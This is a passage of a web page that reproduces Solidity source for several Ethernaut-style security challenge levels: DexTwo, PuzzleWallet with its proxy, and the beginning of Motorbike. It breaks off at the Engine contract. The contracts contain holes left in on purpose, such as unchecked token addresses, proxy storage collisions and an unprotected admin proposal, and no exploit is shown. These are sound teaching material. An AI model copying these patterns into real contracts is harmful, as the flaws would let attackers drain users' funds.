<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">DexTwo</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span>
        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">add_liquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span> <span class="token string">&quot;Not enough to swap&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getSwapAmount</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SwappableTokenTwo</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">SwappableTokenTwo</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span>
        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>
        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">&quot;InvalidApprover&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="puzzlewallet" tabindex="-1"><a class="header-anchor" href="#puzzlewallet" aria-hidden="true">#</a> PuzzleWallet</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
<span class="token keyword">pragma</span> experimental ABIEncoderV2<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">PuzzleProxy</span> <span class="token keyword">is</span> UpgradeableProxy <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> pendingAdmin<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> admin<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _admin<span class="token punctuation">,</span> <span class="token builtin">address</span> _implementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _initData<span class="token punctuation">)</span>
        <span class="token function">UpgradeableProxy</span><span class="token punctuation">(</span>_implementation<span class="token punctuation">,</span> _initData<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        admin <span class="token operator">=</span> _admin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> admin<span class="token punctuation">,</span> <span class="token string">&quot;Caller is not the admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">proposeNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        pendingAdmin <span class="token operator">=</span> _newAdmin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approveNewAdmin</span><span class="token punctuation">(</span><span class="token builtin">address</span> _expectedAdmin<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>pendingAdmin <span class="token operator">==</span> _expectedAdmin<span class="token punctuation">,</span> <span class="token string">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin <span class="token operator">=</span> pendingAdmin<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">upgradeTo</span><span class="token punctuation">(</span><span class="token builtin">address</span> _newImplementation<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyAdmin <span class="token punctuation">{</span>
        <span class="token function">_upgradeTo</span><span class="token punctuation">(</span>_newImplementation<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">PuzzleWallet</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> maxBalance<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token keyword">public</span> whitelisted<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>maxBalance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&quot;Already initialized&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyWhitelisted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>whitelisted<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;Not whitelisted&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setMaxBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _maxBalance<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyWhitelisted <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&quot;Contract balance is not 0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        maxBalance <span class="token operator">=</span> _maxBalance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">addToWhitelist</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">&quot;Not the owner&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        whitelisted<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&lt;=</span> maxBalance<span class="token punctuation">,</span> <span class="token string">&quot;Max balance reached&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> value<span class="token punctuation">,</span> <span class="token string">&quot;Insufficient balance&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> to<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> value<span class="token punctuation">}</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Execution failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">multicall</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> onlyWhitelisted <span class="token punctuation">{</span>
        <span class="token builtin">bool</span> depositCalled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _data <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token builtin">bytes4</span> selector<span class="token punctuation">;</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                selector <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>_data<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>selector <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>selector<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>depositCalled<span class="token punctuation">,</span> <span class="token string">&quot;Deposit can only be called once&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// Protect against reusing msg.value</span>
                depositCalled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Error while delegating call&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="motorbike" tabindex="-1"><a class="header-anchor" href="#motorbike" aria-hidden="true">#</a> Motorbike</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&lt;</span><span class="token version number">0.7.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Motorbike</span> <span class="token punctuation">{</span>
    <span class="token comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
    <span class="token builtin">bytes32</span> <span class="token keyword">internal</span> <span class="token keyword">constant</span> _IMPLEMENTATION_SLOT <span class="token operator">=</span> <span class="token number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token punctuation">;</span>

    <span class="token keyword">struct</span> <span class="token class-name">AddressSlot</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Initializes the upgradeable proxy with an initial implementation specified by \`_logic\`.</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _logic<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>Address<span class="token punctuation">.</span><span class="token function">isContract</span><span class="token punctuation">(</span>_logic<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">_getAddressSlot</span><span class="token punctuation">(</span>_IMPLEMENTATION_SLOT<span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> _logic<span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> _logic<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">&quot;initialize()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Call failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Delegates the current call to \`implementation\`.</span>
    <span class="token keyword">function</span> <span class="token function">_delegate</span><span class="token punctuation">(</span><span class="token builtin">address</span> implementation<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>
        <span class="token comment">// solhint-disable-next-line no-inline-assembly</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            <span class="token function">calldatacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">let</span> result <span class="token operator">:=</span> <span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">returndatacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">switch</span> result
            <span class="token keyword">case</span> <span class="token number">0</span> <span class="token punctuation">{</span> <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
            <span class="token keyword">default</span> <span class="token punctuation">{</span> <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">returndatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Fallback function that delegates calls to the address returned by \`_implementation()\`.</span>
    <span class="token comment">// Will run if no other function in the contract matches the call data</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> virtual <span class="token punctuation">{</span>
        <span class="token function">_delegate</span><span class="token punctuation">(</span><span class="token function">_getAddressSlot</span><span class="token punctuation">(</span>_IMPLEMENTATION_SLOT<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Returns an \`AddressSlot\` with member \`value\` located at \`slot\`.</span>
    <span class="token keyword">function</span> <span class="token function">_getAddressSlot</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> slot<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>AddressSlot <span class="token keyword">storage</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            r_slot <span class="token operator">:=</span> slot
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Engine</span> <span class="token keyword">is</span> Initializable <span class="token punctuation">{</span>
